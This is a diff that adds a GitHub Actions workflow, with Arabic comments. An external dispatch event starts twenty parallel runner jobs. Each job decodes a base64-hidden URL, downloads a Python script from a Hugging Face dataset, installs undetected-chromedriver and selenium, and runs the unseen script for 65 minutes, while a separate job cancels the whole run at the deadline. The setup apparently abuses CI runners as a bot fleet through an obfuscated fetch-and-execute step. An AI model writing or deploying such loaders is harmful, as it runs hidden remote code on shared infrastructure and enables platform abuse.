@@ -1,0 +1,108 @@
+name: Linux Combined Task Armada
+
+on:
+  # استقبال أمر التشغيل من الخارج عبر التوكن بالكلمة المفتاحية: start
+  repository_dispatch:
+    types: [start]
+
+concurrency:
+  group: combined-armada-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # منظم الإيقاف الشامل: يُنهي الـ workflow بكامله عند علامة 65 دقيقة
+  # =================================================================
+  halt-coordinator:
+    name: "Halt Coordinator"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Fire Complete Shutdown Protocol
+        run: |
+          echo "[COORDINATOR] Halt coordinator engaged. Full shutdown scheduled at the 65-minute milestone."
+          echo "[COORDINATOR] Following workflow fingerprint: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[COORDINATOR] Milestone achieved! Firing complete shutdown protocol..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[COORDINATOR] Shutdown protocol fired. All engaged and awaiting units will be eliminated."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات الأسطول
+  # =================================================================
+  roll-out-armada:
+    name: "ArmadaUnit-${{ matrix.unit_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_code: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
+      # (الطور أ) إرساء القاعدة التشغيلية
+      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
+      - name: Lay Operational Bedrock
+        run: |
+          echo "[BEDROCK] Laying operational bedrock for ArmadaUnit-${{ matrix.unit_code }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
+      # (الطور ب) استجلاب ملف التشغيل الرئيسي
+      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
+      - name: Summon Operational Payload
+        run: |
+          echo "[SUMMON] Summoning app_task.py from designated storage node..."
+          STORAGE_NODE=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$STORAGE_NODE" -o app_task.py
+          echo "[SUMMON] Operational payload summoned to workspace."
+
+      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
+      # (الطور ج) تجهيز الحزم التشغيلية
+      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
+      - name: Stage Runtime Packages
+        run: |
+          echo "[STAGE] Staging runtime packages for execution..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
+      # (الطور د) التشغيل مع إشراف دورة الحياة (65 دقيقة)
+      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
+      - name: Execute Lifecycle Operation
+        run: |
+          echo ">> Rolling out ArmadaUnit-${{ matrix.unit_code }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          ARMADA_PID=$!
+          
+          echo ">> Lifecycle supervisor active. Maximum span: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $ARMADA_PID 2>/dev/null; then
+            echo ">> Maximum span exceeded! Discharging operation..."
+            kill -9 $ARMADA_PID
+            echo ">> Operation discharged by supervisor."
+          else
+            echo ">> Operation concluded within maximum span."
+          fi
